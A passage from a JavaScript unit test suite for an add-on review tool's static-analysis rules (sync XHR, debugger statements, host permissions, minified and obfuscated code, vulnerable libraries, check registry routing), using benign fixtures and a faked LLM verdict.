// Unit tests for the new deterministic rule modules and the yaml-driven loader.

import { withManifest, parsedSources, parsed } from "./manifest-ctx.js";
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

import syncXhr from "../../src/checks/rules/sync-xhr.js";
import debuggerStatement from "../../src/checks/rules/debugger-statement.js";
import asyncOnMessage from "../../src/checks/rules/async-onmessage.js";
import minimizeHostPermissions from "../../src/checks/rules/minimize-host-permissions.js";
import codeSanity from "../../src/checks/rules/code-sanity.js";
import deprecatedApi from "../../src/checks/rules/deprecated-api.js";
import missingPermission from "../../src/checks/rules/missing-permission.js";
import experimentMissingMax from "../../src/checks/rules/experiment-missing-strict-max-version.js";
import experimentManualReview from "../../src/checks/rules/experiment-manual-review.js";
import experimentUnknownApi from "../../src/checks/rules/experiment-unknown-api.js";
import nonExperimentMax from "../../src/checks/rules/non-experiment-strict-max-version.js";
import experimentNotAllowed from "../../src/checks/rules/experiment-not-allowed.js";
import missingLibrary from "../../src/checks/rules/missing-library.js";
import minifiedCode from "../../src/checks/rules/minified-code.js";
import obfuscatedCode from "../../src/checks/rules/obfuscated-code.js";
import {
  VERDICT,
  URL_CLASS,
  CHANNEL,
  REVIEW_MODE,
} from "../../src/lib/enum.js";
import vendorVulnerable from "../../src/checks/rules/vendor-vulnerable.js";
import vendorVulnerableDev from "../../src/checks/rules/vendor-vulnerable-dev.js";
import { rawSha256 } from "../../src/normalize/hash.js";
import apiCoverage from "../../src/checks/rules/api-coverage.js";
import strictMaxBumpOnly from "../../src/checks/rules/strict-max-version-bump-only.js";
import trademarkViolation from "../../src/checks/rules/trademark-violation.js";
import coreSymbolInWebext from "../../src/checks/rules/core-symbol-in-webext.js";
import missingEnglish from "../../src/checks/rules/missing-english-localization.js";
import disguisedResource from "../../src/checks/rules/disguised-resource.js";
import disguisedStylesheet from "../../src/checks/rules/disguised-stylesheet.js";
import disguisedTransmission from "../../src/checks/rules/disguised-transmission.js";
import unparsableFile from "../../src/checks/rules/unparsable-file.js";
import dataExfiltration from "../../src/checks/rules/data-exfiltration.js";
import undeclaredBuildSource from "../../src/checks/rules/undeclared-build-source.js";
import buildNotFromSource from "../../src/checks/rules/build-not-from-source.js";
import unsupportedBuildTool from "../../src/checks/rules/unsupported-build-tool.js";
import buildRegistryRedirect from "../../src/checks/rules/build-registry-redirect.js";
import committedNodeModules from "../../src/checks/rules/committed-node-modules.js";
import cleartextTransmission from "../../src/checks/rules/cleartext-transmission.js";
import privacyPolicy from "../../src/checks/rules/privacy-policy.js";
import nativeMessaging from "../../src/checks/rules/native-messaging.js";
import defaultLocaleMissing from "../../src/checks/rules/default-locale-missing.js";
import defaultLocaleUnused from "../../src/checks/rules/default-locale-unused.js";
import addonIconMissing from "../../src/checks/rules/addon-icon-missing.js";
import unrecognizedManifestKey from "../../src/checks/rules/unrecognized-manifest-key.js";
import backgroundModule from "../../src/checks/rules/background-module.js";
import unusedPermissionRecheck from "../../src/checks/rules/unused-permission-recheck.js";
import unusedPermissionProducer from "../../src/checks/rules/unused-permission.js";
import unrecognizedFileType from "../../src/checks/rules/unrecognized-file-type.js";
import { scanNetworkSinks } from "../../src/parse/network-sinks.js";
import { parseApiUsage } from "../../src/parse/api-usage.js";
import { getPermissionAnalysis } from "../../src/lib/permissions.js";
import {
  loadChecks,
  loadRegistry,
  runOneCheck,
  runChecks,
  assertRequiredPhaseSections,
} from "../../src/checks/registry.js";
import { finding, SEVERITY } from "../../src/report/finding.js";
import { runLlmCheck } from "../../src/checks/escalation.js";

// loadChecks groups its result by phase (a check's phase IS the list it lands in).
// Flatten it when a test cares about the checks themselves, not which phase they run in.
const allChecks = (byPhase) => [...byPhase.values()].flat();
import unknownApi from "../../src/checks/rules/unknown-api.js";
import { resolveApiUsages, unknownApis } from "../../src/lib/api-resolution.js";
import strictMaxVersionApi from "../../src/checks/rules/strict-max-version-api.js";
import strictMinVersionApi from "../../src/checks/rules/strict-min-version-api.js";
import { loadSchemaFiles } from "../../src/schema/load.js";
import { buildSchemaIndex, SchemaIndex } from "../../src/schema/index.js";
import { collectJsSources } from "../../src/addon/sources.js";
import { runExtractionPass, apiUsageOf } from "../../src/checks/extract.js";
import { parseVendorManifest } from "../../src/normalize/vendor.js";

const here = path.dirname(fileURLToPath(import.meta.url));
const schema = buildSchemaIndex(
  loadSchemaFiles(path.join(here, "..", "schema-fixture"))
);

const jsCtx = (code, manifest = {}) => ({
  jsSources: parsed([{ file: "f.js", code, lineOffset: 0, inline: false }]),
  addon: { files: new Map(), manifest },
  options: {},
});

// ctx whose addon.files is a path->content map (for the file-level bundled /
// obfuscated checks, which read raw file bytes rather than parsed sources). The
// vendored set is resolved deterministically, as the pipeline does once up front.
const filesCtx = (files, { libs = [] } = {}) => {
  const addon = {
    files: new Map(Object.entries(files).map(([k, v]) => [k, Buffer.from(v)])),
  };
  const manifest = parseVendorManifest(addon);
  addon.vendor = { set: new Set(manifest.map((e) => e.path)), manifest };
  // `libs`: file keys whose raw hash is registered as a known library, so the
  // hash-based classifier tags them `library` (and names them).
  const libraryHashes = new Map(
    libs.map((f) => [
      rawSha256(addon.files.get(f)),
      { name: "demolib", version: "1.0.0" },
    ])
  );
  return { addon, options: { libraryHashes } };
};

// Run a check with a fake ctx.note collector and return the recorded activity.
function notesFrom(check, ctx) {
  const notes = [];
  ctx.note = (file, loc, item, verdict) => notes.push({ file, item, verdict });
  check.run(withManifest(ctx));
  return notes;
}

// ---- sync-xhr ----
// Only the explicit async=false third arg to open() is a synchronous XHR;
// async=true and an omitted third arg (defaults to async) must not flag.
test("sync-xhr flags open(..., false), not async/omitted", () => {
  assert.equal(
    syncXhr.run(withManifest(jsCtx(`x.open("GET", "/u", false);`))).length,
    1
  );
  assert.equal(
    syncXhr.run(withManifest(jsCtx(`x.open("GET", "/u", true);`))).length,
    0
  );
  assert.equal(
    syncXhr.run(withManifest(jsCtx(`x.open("GET", "/u");`))).length,
    0
  );
});

// ---- debugger ----
// A debugger that always runs (top level, in a function body, or inside a loop)
// is flagged, but one guarded by any if/else branch is treated as intentional.
test("debugger-statement flags unconditional debugger, allows if-guarded", () => {
  const n = (code) => debuggerStatement.run(withManifest(jsCtx(code))).length;
  // Unconditional (always executes) -> flagged.
  assert.equal(n(`debugger;`), 1);
  assert.equal(n(`function f() { doStuff(); debugger; }`), 1);
  assert.equal(n(`for (const x of xs) { debugger; }`), 1); // a loop is not a flag
  // Conditional (behind an if / config flag) -> allowed.
  assert.equal(n(`if (DEBUG) debugger;`), 0);
  assert.equal(n(`if (config.debug) { debugger; }`), 0);
  assert.equal(n(`if (x) {} else { debugger; }`), 0);
});

// ---- async onMessage ----
// Only an async callback on runtime.onMessage flags (it breaks sendResponse);
// a sync onMessage listener and an unrelated async addEventListener do not.
test("async-onmessage flags an async runtime.onMessage listener only", () => {
  assert.equal(
    asyncOnMessage.run(
      withManifest(
        jsCtx(`browser.runtime.onMessage.addListener(async (m) => {});`)
      )
    ).length,
    1
  );
  assert.equal(
    asyncOnMessage.run(
      withManifest(jsCtx(`messenger.runtime.onMessage.addListener((m) => {});`))
    ).length,
    0
  );
  assert.equal(
    asyncOnMessage.run(
      withManifest(jsCtx(`el.addEventListener("click", async () => {});`))
    ).length,
    0
  );
});

// sync-xhr / debugger-statement / async-onmessage are source-level coding-pattern
// checks: like code-sanity they skip non-authored (library / minified / vendored)
// code, so a library's own sync XHR, debugger, or async onMessage listener is not
// flagged. The same patterns in an authored file are still flagged.
test("sync-xhr / debugger / async-onmessage skip non-authored code", () => {
  const body =
    `x.open("GET", "/u", false);\n` +
    `debugger;\n` +
    `browser.runtime.onMessage.addListener(async (m) => {});\n`;
  const code = body + "var a = 1;\n".repeat(200); // >1KB so it is classified
  const ctxFor = (file, lib = false) => ({
    jsSources: parsed([{ file, code, lineOffset: 0 }]),
    addon: { files: new Map([[file, Buffer.from(code)]]), manifest: {} },
    options: lib
      ? {
          libraryHashes: new Map([
            [rawSha256(Buffer.from(code)), { name: "lib", version: "1" }],
          ]),
        }
      : {},
  });
  // A hash-identified library -> non-authored -> all three checks skip it.
  const lib = ctxFor("vendor/lib.min.js", true);
  assert.equal(syncXhr.run(withManifest(lib)).length, 0);
  assert.equal(debuggerStatement.run(withManifest(lib)).length, 0);
  assert.equal(asyncOnMessage.run(withManifest(lib)).length, 0);
  // The same code, not a known library, is still flagged by each.
  const app = ctxFor("src/app.js");
  assert.equal(syncXhr.run(withManifest(app)).length, 1);
  assert.equal(debuggerStatement.run(withManifest(app)).length, 1);
  assert.equal(asyncOnMessage.run(withManifest(app)).length, 1);
});

// ---- minimize host permissions ----
// Broad required host patterns (<all_urls> and *://*/*) are flagged, while a
// specific scoped origin like https://example.com/* is left alone.
test("minimize-host-permissions flags broad required host patterns only", () => {
  const out = minimizeHostPermissions.run(
    withManifest(
      jsCtx("", {
        host_permissions: ["<all_urls>", "*://*/*", "https://example.com/*"],
      })
    )
  );
  assert.equal(out.length, 2); // all_urls + *://*/* ; example.com is scoped
});

// ---- code sanity (ESLint) ----
// prefer-const is a style/fixable rule, not a review concern, so it is never
// flagged. no-undef is off too, so browser/messenger globals are never flagged.
test("code-sanity does not flag prefer-const or globals", () => {
  const neverReassigned = `let x = 1;\nconsole.log(x);`;
  assert.equal(codeSanity.run(withManifest(jsCtx(neverReassigned))).length, 0);

  // browser/messenger are not flagged as undefined (no-undef is disabled).
  const clean = codeSanity.run(
    withManifest(
      jsCtx(`const y = browser.runtime.id;\nmessenger.tabs.query({});`)
    )
  );
  assert.equal(clean.length, 0);
});

// no-empty flags an empty block (e.g. an error-swallowing empty catch), but not
// an empty function body (which is no-empty-function's concern, not enabled). The
// rule runs whenever code-sanity runs - the --eslint gate is applied upstream at
// check selection (pipeline.js), not in the rule.
test("code-sanity flags an empty block, not an empty function body", () => {
  const out = codeSanity.run(
    withManifest(jsCtx(`try { risky(); } catch (e) {}`))
  );
  assert.equal(out.length, 1);
  assert.match(out[0].item, /no-empty/);
  assert.equal(
    codeSanity.run(withManifest(jsCtx(`const f = () => {};`))).length,
    0
  );
});

// Third-party / minified / obfuscated / VENDOR.md code is not linted (its
// findings are noise); the same code under an authored filename is.
test("code-sanity skips non-authored code, lints authored code", () => {
  const redecl = "var a = 1;\n".repeat(200); // ~2KB, trips no-redeclare, short lines
  const ctxFor = (file, lib = false) => ({
    jsSources: parsed([{ file, code: redecl, lineOffset: 0 }]),
    addon: { files: new Map([[file, Buffer.from(redecl)]]), manifest: {} },
    options: lib
      ? {
          libraryHashes: new Map([
            [rawSha256(Buffer.from(redecl)), { name: "lib", version: "1" }],
          ]),
        }
      : {},
  });
  // A hash-identified library -> non-authored -> skipped entirely.
  assert.equal(
    codeSanity.run(withManifest(ctxFor("vendor/lib.min.js", true))).length,
    0
  );
  // Authored source of the same code is linted.
  assert.ok(codeSanity.run(withManifest(ctxFor("src/app.js"))).length > 0);
});

// ---- missing-library / obfuscated-code (shared bundled.js classifier) ----
// missing-library flags a bundled file whose CONTENT HASH matches a known library
// release (`libs`), skipping the developer's own code and VENDOR.md-declared
// files. A file the hash DB does not recognize - even a UMD-wrapper or a .min name
// - is not a library (only a content-hash match is the library signal).
test("missing-library flags hash-identified libraries, not undeclared/readable/VENDORed", () => {
  const MIN = "a;".repeat(600);
  // Hash match -> flagged.
  assert.equal(
    missingLibrary.run(
      withManifest(
        filesCtx({ "vendor/x.min.js": MIN }, { libs: ["vendor/x.min.js"] })
      )
    ).length,
    1
  );
  // A UMD wrapper NOT in the hash DB -> not a library.
  const umd =
    "(function () { if (typeof exports === 'object' && typeof define === 'function') {} })();\n".repeat(
      40
    );
  assert.equal(
    missingLibrary.run(withManifest(filesCtx({ "lib/umd.js": umd }))).length,
    0
  );
  // Readable code -> not flagged.
  const readable = "function f(a) {\n  return a + 1;\n}\n".repeat(40);
  assert.equal(
    missingLibrary.run(withManifest(filesCtx({ "bg.js": readable }))).length,
    0
  );
  // A known library declared in VENDOR.md -> excluded before classification.
  const vendor =
    "vendor/x.min.js:\n - Version: 1.0\n - URL: https://unpkg.com/x@1.0.0/dist/x.min.js\n";
  assert.equal(
    missingLibrary.run(
      withManifest(
        filesCtx(
          { "VENDOR.md": vendor, "vendor/x.min.js": MIN },
          { libs: ["vendor/x.min.js"] }
        )
      )
    ).length,
    0
  );
});

// minified-code flags minified (but not obfuscated) NON-library code; a file the
// hash DB recognizes as a library is deferred to missing-library, obfuscated code
// to obfuscated-code, and readable code is left alone.
test("minified-code flags minified non-library JS only", () => {
  // Minified line geometry: one long, dense line.
  const minified = "var a=1;b=2;c=3;d=4;".repeat(100) + "\n";
  assert.equal(
    minifiedCode.run(withManifest(filesCtx({ "bundle.js": minified }))).length,
    1
  );
  // The same bytes recognized as a known library -> missing-library's job.
  assert.equal(
    minifiedCode.run(
      withManifest(filesCtx({ "x.min.js": minified }, { libs: ["x.min.js"] }))
    ).length,
    0
  );
  // Readable code -> not flagged.
  const readable = "function f(a) {\n  return a + 1;\n}\n".repeat(40);
  assert.equal(
    minifiedCode.run(withManifest(filesCtx({ "bg.js": readable }))).length,
    0
  );
});

// obfuscated-code flags obfuscated NON-library code, and NOT a merely-minified
// file (that is minified-code's job). A file that is BOTH minified and obfuscated
// is reported here only (obfuscation is the stronger signal), so it never yields
// two findings.
test("obfuscated-code flags obfuscated JS; minified-only routes elsewhere", () => {
  // Array-replacement obfuscation on short lines: obfuscated (recognized by
  // structure), NOT minified-by-geometry.
  const obf =
    `var _0xarr = [${Array.from({ length: 60 }, (_, i) => `"item_${i}"`).join(", ")}];\n` +
    "function _0xget(i) { return _0xarr[i]; }\n" +
    Array.from({ length: 20 }, (_, i) => `console["log"](_0xget(${i}));`).join(
      "\n"
    );
  assert.equal(
    obfuscatedCode.run(withManifest(filesCtx({ "o.js": obf }))).findings.length,
    1
  );
  assert.equal(
    minifiedCode.run(withManifest(filesCtx({ "o.js": obf }))).length,
    0
  );
  // A merely-minified file is NOT obfuscated-code's concern.
  const minified = "var a=1;b=2;c=3;d=4;".repeat(100) + "\n";
  assert.equal(
    obfuscatedCode.run(withManifest(filesCtx({ "m.js": minified }))).findings
      .length,
    0
  );
  // The same obfuscation collapsed onto one dense line -> minified geometry AND
  // obfuscated -> obfuscated-code only (precedence), minified-code stays silent.
  const both =
    `var _0xa=[${Array.from({ length: 80 }, (_, i) => `"s${i}"`).join(",")}];` +
    "function _0xg(i){return _0xa[i];}" +
    Array.from({ length: 80 }, (_, i) => `console.log(_0xg(${i}));`).join("");
  assert.equal(
    obfuscatedCode.run(withManifest(filesCtx({ "b.js": both }))).findings
      .length,
    1
  );
  assert.equal(
    minifiedCode.run(withManifest(filesCtx({ "b.js": both }))).length,
    0
  );
});

// A weak-family-only file (a revealing-module pattern, which the structural
// detector flags but readable code also has) is the UNSURE verdict: no
// deterministic finding, one LLM candidate judged from the file's own content.
// With a token, evaluate's per-candidate verdict drives the check's OWN resolve
// mapping - fail -> finding, pass -> drop, unsure -> manual review - which the
// deterministic and no-token paths never exercise. ctx.llm.evaluate is faked
// (no network); each run returns the given verdict for every candidate.
test("obfuscated-code maps the LLM verdict of a weak-only candidate: fail->finding, pass->drop, unsure->manual", async () => {
  // A revealing-module pattern over the 1024-byte floor: an IIFE-initialized
  // const referenced only as `Helper.method(...)`, which structurally matches
  // the WEAK family the detector applies no density guard to -> UNSURE, not FAIL.
  const methods = Array.from(
    { length: 12 },
    (_, i) =>
      `  function step${i}(value) {\n` +
      `    const result = String(value || "").trim().toLowerCase();\n` +
      `    return result.length > ${i} ? result : "fallback${i}";\n` +
      `  }\n`
  ).join("");
  const returns = Array.from({ length: 12 }, (_, i) => `step${i}`).join(", ");
  const calls = Array.from(
    { length: 12 },
    (_, i) => `Helper.step${i}("x${i}");`
  ).join("\n");
  const weak = `const Helper = (() => {\n${methods}  return { ${returns} };\n})();\n${calls}\n`;

  const step = obfuscatedCode.run(withManifest(filesCtx({ "app.js": weak })));
  // No deterministic finding for a weak-only match - just the one candidate.
  assert.equal(step.findings.length, 0);
  assert.equal(step.llm.candidates.length, 1);
  assert.equal(step.llm.candidates[0].file, "app.js");

  // The check owns the id->file table (perCandidateResolve); the model only ever
  // returns a verdict keyed to that minted id. Fake evaluate with a token present.
  const check = {
    id: "obfuscated-code",
    title: "Obfuscated code",
    prompt: "P",
  };
  const drive = async (verdict) => {
    const ctx = {
      addon: {},
      llm: {
        evaluate: async () =>
          new Map(
            step.llm.candidates.map((c) => [c.id, { verdict, reason: null }])
          ),
      },
    };
    return runLlmCheck(ctx, check, step.llm);
  };

  const failed = await drive(VERDICT.FAIL);
  assert.equal(failed.findings.length, 1);
  assert.equal(failed.findings[0].file, "app.js");
  assert.equal(failed.manualItems.length, 0);

  const passed = await drive(VERDICT.PASS);
  assert.equal(passed.findings.length, 0);
  assert.equal(passed.manualItems.length, 0);

  const unsure = await drive(VERDICT.UNSURE);
  assert.equal(unsure.findings.length, 0);
  assert.equal(unsure.manualItems.length, 1);
  // The manual entry is located by the file (the finding's locus); it carries no
  // `{{item}}` token - the reviewer inspects the named file by hand.
  assert.equal(unsure.manualItems[0].file, "app.js");
});

// vendor-vulnerable surfaces a vulnerability the OSV audit recorded for a
// hash-IDENTIFIED (undeclared) library too - it reads addon.vendor.vulnerabilities
// regardless of source. Such an entry carries an empty token (no declaration
// line), so the finding has no line and anchors at the bundled file - even if the
// file body happens to contain its own path. The OSV band still drives severity.
test("vendor-vulnerable surfaces an identified-library vulnerability, file-anchored", () => {
  const file = "vendor/jquery.min.js";
  const ctx = {
    addon: {
      files: new Map([
        // The path appears in a sourcemap comment - an empty token must still
        // yield no line (the guard must not fall back to a substring match).
        [file, Buffer.from(`var a=1;\n//# sourceMappingURL=${file}.map\n`)],
      ]),
      vendor: {
        vulnerabilities: [
          {
            name: "jquery",
            version: "1.7.2",
            ids: ["CVE-2020-11022"],
            severity: "high",
            fixed: ["3.5.0"],
            file,
            token: "", // no declaration line for an identified library
          },
        ],
      },
    },
  };
  const out = vendorVulnerable.run(withManifest(ctx));
  assert.equal(out.length, 1);
  assert.equal(out[0].file, file);
  assert.equal(out[0].item, "jquery");
  assert.ok(!out[0].loc); // no declaration line - anchored at the file
  assert.equal(out[0].severity, SEVERITY.ERROR); // high band -> error
});

// vendor-vulnerable-dev mirrors vendor-vulnerable for the SCA dev set: it reads
// addon.vendor.devVulnerabilities (populated only in SCA mode) and maps each to a
// finding, band-driven severity and all. A package.json dep anchors at its name.
test("vendor-vulnerable-dev surfaces a dev-dependency vulnerability", () => {
  const ctx = {
    addon: {
      files: new Map([
        [
          "package.json",
          Buffer.from('{"devDependencies":{"esbuild":"0.19.0"}}'),
        ],
      ]),
      vendor: {
        devVulnerabilities: [
          {
            name: "esbuild",
            version: "0.19.0",
            ids: ["CVE-2021-0002"],
            severity: "moderate",
            fixed: ["0.19.1"],
            file: "package.json",
            token: "esbuild",
          },
        ],
      },
    },
  };
  const out = vendorVulnerableDev.run(withManifest(ctx));
  assert.equal(out.length, 1);
  assert.equal(out[0].item, "esbuild");
  assert.equal(out[0].loc.line, 1); // anchored at the dep's declaration line
  assert.equal(out[0].severity, SEVERITY.WARNING); // moderate band -> warning
  assert.equal(out[0].data.fixed, "0.19.1");
});

// The prod set drives vendor-vulnerable, the dev set drives this check - so an
// empty dev set yields nothing.
test("vendor-vulnerable-dev yields nothing when devVulnerabilities is empty", () => {
  const ctx = {
    addon: { files: new Map(), vendor: { devVulnerabilities: [] } },
  };
  assert.deepEqual(vendorVulnerableDev.run(withManifest(ctx)), []);
});

// ---- api-coverage (static-analysis self-report) ----
// api-coverage reports the runner's own blind spots: a file that failed to
// parse, and each unresolved dynamic/aliased access (with its location). A
// source that parsed cleanly with no limitations yields nothing. Severity is
// left unset - runChecks stamps the yaml entry's type ("info").
test("api-coverage flags dynamic limits; unparsable-file flags parse failures", () => {
  const apiUsages = [
    { file: "broken.js", parseError: "Unexpected token (3:5)" },
    {
      file: "dyn.js",
      limitations: [
        { reason: "dynamic browser[x] access", line: 7, column: 2 },
      ],
    },
    { file: "ok.js", limitations: [] },
  ];
  // dyn.js must be in the pure WebExtension tree for api-coverage to report it.
  const cov = apiCoverage.run(
    withManifest({
      apiUsages,
      addon: {
        manifest: { background: { scripts: ["dyn.js"] } },
        files: new Map([["dyn.js", Buffer.from("")]]),
      },
    })
  );
  assert.equal(cov.length, 1);
  const dyn = cov[0];
  assert.equal(dyn.file, "dyn.js");
  assert.equal(dyn.severity, null);
  assert.equal(dyn.item, "dynamic browser[x] access"); // reason passed through
  assert.equal(dyn.loc.line, 7); // carries the source location

  const unparsable = unparsableFile.run(withManifest({ apiUsages }));
  assert.equal(unparsable.length, 1);
  assert.equal(unparsable[0].file, "broken.js");
  // The "could not be parsed" wording lives in the registry; the check emits the
  // parser error as data.
  assert.match(unparsable[0].data.detail, /Unexpected token/);
});

// ---- strict-max-version-bump-only (diff vs --previous) ----
// With a previous version it fires only when the sole change is a version bump
// plus the gecko strict_max_version; any other file or manifest change, an
// unchanged strict_max_version, or a missing baseline keeps it silent.
test("strict-max-version-bump-only fires only on a pure version+strict_max bump", () => {
  const manifest = (max, version = "1.0") => ({
    manifest_version: 3,
    name: "x",
    version,
    browser_specific_settings: {
      gecko: { id: "a@b", strict_max_version: max },
    },
  });
  const ver = (m, files = {}) => ({
    manifest: m,
    files: new Map([
      ["manifest.json", Buffer.from(JSON.stringify(m))],
      ...Object.entries(files).map(([k, v]) => [k, Buffer.from(v)]),
    ]),
  });
  const bg = "console.log(1);\n";
  const prev = ver(manifest("115.0"), { "bg.js": bg });
  const run = (addon, previous) =>
    strictMaxBumpOnly.run(withManifest({ addon, previous }));

  // Only version + strict_max_version changed -> fires.
  assert.equal(
    run(ver(manifest("128.0", "1.1"), { "bg.js": bg }), prev).length,
    1
  );
  // No baseline -> silent.
  assert.equal(
    run(ver(manifest("128.0", "1.1"), { "bg.js": bg }), null).length,
    0
  );
  // A code file also changed -> silent.
  assert.equal(
    run(ver(manifest("128.0", "1.1"), { "bg.js": "console.log(2);\n" }), prev)
      .length,
    0
  );
  // strict_max_version unchanged (only the version bumped) -> silent.
  assert.equal(
    run(ver(manifest("115.0", "1.1"), { "bg.js": bg }), prev).length,
    0
  );
  // Another manifest key changed too -> silent.
  const renamed = { ...manifest("128.0", "1.1"), name: "y" };
  assert.equal(run(ver(renamed, { "bg.js": bg }), prev).length, 0);

  // The fired finding anchors on the strict_max_version line of the current
  // manifest text (multi-line, unlike the single-line JSON.stringify helper).
  const curText =
    '{\n  "version": "1.1",\n' +
    '  "browser_specific_settings": { "gecko": { "id": "a@b", "strict_max_version": "128.0" } }\n}\n';
  const located = run(
    {
      manifest: manifest("128.0", "1.1"),
      files: new Map([
        ["manifest.json", Buffer.from(curText)],
        ["bg.js", Buffer.from(bg)],
      ]),
    },
    prev
  );
  assert.equal(located.length, 1);
  assert.equal(located[0].loc.line, 3);
});

// The diff gate: the registry marks this a diff check (diff: true), so the
// orchestrator runs it only with a --diff-to baseline (see runChecks).
test("strict-max-version-bump-only is registered as a diff check", async () => {
  const checks = allChecks(await loadChecks(loadRegistry()));
  const c = checks.find((x) => x.id === "strict-max-version-bump-only");
  assert.equal(c?.diff, true);
});

// The eslint gate (eslintEligible): code-sanity is eslint:true, so it loads ONLY with the
// --eslint flag. Gated in loadChecks, before the import, so the eslint dependency is not
// pulled in when the check will not run.
test("code-sanity is gated by the --eslint flag", async () => {
  const off = allChecks(await loadChecks(loadRegistry()));
  assert.equal(
    off.some((c) => c.id === "code-sanity"),
    false
  );
  const on = allChecks(await loadChecks(loadRegistry(), { eslint: true }));
  assert.equal(
    on.some((c) => c.id === "code-sanity"),
    true
  );
});

// The SCA mode gate (scaEligible, mirrors the diff gate): the XPI bundled/vendor
// checks are sca:false (skipped for a source-code submission), the source
// dependency audit is sca:true (XPI-only-skipped), and a code check is untagged
// (runs in both, the orchestrator just switches the review SOURCE).
test("checks carry the sca mode tag (false=XPI-only, true=SCA-only, undefined=both)", async () => {
  const checks = allChecks(await loadChecks(loadRegistry()));
  const sca = (id) => checks.find((x) => x.id === id)?.sca;
  // minified-code runs in BOTH modes: a minified file is non-authored and rejected
  // whether it ships in a built XPI or sits in a source-code submission's source.
  assert.equal(sca("minified-code"), undefined);
  // untrusted-minified-library stays XPI-only: it reads untrustedLibs, populated only
  // by the CDN-lookup setup step, which SCA skips - it cannot fire in SCA regardless.
  assert.equal(sca("untrusted-minified-library"), false);
  // unused-files runs in BOTH modes: it describes the shipped XPI (dead files the
  // build ships), like bundled-files / minimize-WAR - all registered `input: xpi`.
  assert.equal(sca("unused-files"), undefined);
  assert.equal(sca("unused-files-recheck"), undefined);
  assert.equal(sca("unpopular-source-dependency"), true); // SCA-only dep audit
  assert.equal(sca("undeclared-build-source"), true); // SCA-only build review
  assert.equal(sca("unsupported-build-tool"), true); // SCA-only build policy
  assert.equal(sca("build-registry-redirect"), true); // SCA-only build policy
  assert.equal(sca("committed-node-modules"), true); // SCA-only build policy
  assert.equal(sca("eval-call"), undefined); // a code check: both modes
  assert.equal(sca("unknown-api"), undefined);
});

// The shipped-vs-review-target artifact is chosen in ONE place - runChecks routes
// each check to its artifact's context on the registry `input` (source = the review
// target, xpi = the built XPI). A check reads only ctx.addon and the orchestrator
// hands it the correct one; no ctx field or helper exposes the other artifact, so
// the guarantee is structural (not a source scan). These tests pin the dangerous
// set and prove the routing reaches even the LLM adjudication.

// Every check declares a valid input, and the (rare, dangerous) input:xpi set is
// pinned to exactly the structure checks. A new or flipped check trips this test
// rather than silently reading the wrong artifact.
test("every non-recheck check declares a valid input (rechecks declare none); the input:xpi set is exactly the pinned structure checks", async () => {
  const byPhase = await loadChecks(loadRegistry());
  const checks = allChecks(byPhase);
  // A post-summary-phase consumer declares NO input - it runs on the main ctx and is
  // labelled by its producer's corpus (see labelInputFor). Its input is undefined.
  const rechecks = new Set(byPhase.get("post-summary"));
  for (const c of rechecks) {
    assert.equal(
      c.input,
      undefined,
      `recheck "${c.id}" must not declare an input`
    );
  }
  for (const c of checks.filter((x) => !rechecks.has(x))) {
    assert.ok(
      c.input === "source" ||
        c.input === "xpi" ||
        c.input === "build" ||
        c.input === "manifest",
      `check "${c.id}" has an invalid input ${JSON.stringify(c.input)}`
    );
  }
  // input: manifest reads the shipped manifest ONLY, on a ctx with no file corpus
  // (buildManifestCtx). The pure-manifest checks; extending this set is deliberate too.
  const manifest = checks
    .filter((c) => c.input === "manifest")
    .map((c) => c.id)
    .sort();
  assert.deepEqual(manifest, [
    "addon-icon-missing",
    "csp-unsafe-eval",
    "csp-unsafe-inline",
    "experiment-manual-review",
    "experiment-missing-strict-max-version",
    "experiment-overrides-api",
    "manifest-invalid-json",
    "manifest-missing",
    "manifest-missing-key",
    "manifest-unknown-permission",
    "manifest-version-mismatch",
    "minimize-host-permissions",
    "mistyped-manifest-value",
    "native-messaging",
    "non-experiment-strict-max-version",
  ]);
  const xpi = checks
    .filter((c) => c.input === "xpi")
    .map((c) => c.id)
    .sort();
  // The ONLY checks that read the built XPI instead of the review target: the file /
  // _locales / reachability-structure checks. Extending this set is deliberate -
  // update the check AND this pin together.
  assert.deepEqual(xpi, [
    "background-module",
    "background-page-module",
    "bundled-files",
    "default-locale-missing",
    "default-locale-unused",
    "minimize-web-accessible-resources",
    "missing-english-localization",
    "strict-max-version-bump-only",
    "trademark-violation",
    "unrecognized-file-type",
    "unrecognized-manifest-key",
    "unused-files",
  ]);
  // input: build reads the SCA build files (archive minus source minus node_modules).
  // The three build-review checks (gated on the setup classification) plus the
  // deterministic build-policy checks; extending this set is deliberate too.
  const build = checks
    .filter((c) => c.input === "build")
    .map((c) => c.id)
    .sort();
  assert.deepEqual(build, [
    "build-lifecycle-hook",
    "build-not-from-source",
    "build-registry-redirect",
    "committed-build-artifact",
    "committed-node-modules",
    "undeclared-build-source",
    "unsupported-build-tool",
  ]);
});

// The routing reaches the LLM adjudication too - the seam that finding B slipped
// through. An `input: xpi` LLM check builds candidates over the XPI, and runOneCheck
// -> runLlmCheck must hand the model the XPI's files (via the routed ctx.addon), not
// a captured review source. unused-files emits a candidate for an ambiguous file (a
// live dynamic loader names it), so this exercises the real corpus path with a stub
// llm that records the addon it was given.
test("an input:xpi LLM check adjudicates over its routed (XPI) addon", async () => {
  const mk = (obj) =>
    new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)]));
  const manifest = { manifest_version: 3, background: { scripts: ["bg.js"] } };
  // bg.js is live and dynamically imports a runtime-built path that names helper.js,
  // so helper.js is ambiguous and unused-files emits an LLM candidate for it.
  const xpi = {
    files: mk({
      "manifest.json": JSON.stringify(manifest),
      "bg.js": `const p = "./helper.js";\nimport(p);`,
      "helper.js": `console.log(1);`,
    }),
    manifest,
  };
  const [check] = allChecks(
    await loadChecks(loadRegistry(), { only: ["unused-files"] })
  );
  let seenAddon;
  // The orchestrator routes an `input: xpi` check to a ctx whose addon is the XPI.
  const ctx = {
    addon: xpi,
    jsSources: parsedSources(xpi, { schema }),
    schema,
    mode: REVIEW_MODE.SCA,
    options: {},
    llm: {
      evaluate: async (req) => {
        seenAddon = req.addon;
        return new Map(
          req.candidates.map((c) => [c.id, { verdict: VERDICT.UNSURE }])
        );
      },
    },
  };
  await runOneCheck(withManifest(ctx), check, "[1/1]");
  assert.equal(seenAddon, xpi); // the model read the XPI's files, not a source addon
});

// ---- build review: undeclared-build-source + build-not-from-source (SCA deterministic;
// each reads the setup classification on ctx.addon.buildReview; the one LLM call lives in
// analyzeBuild, tested in build-analysis.test.js) ----

const buildCtx = (review) => ({
  addon: { files: new Map(), buildReview: review },
});
const review = (over) => ({
  classification: "ok",
  reason: "",
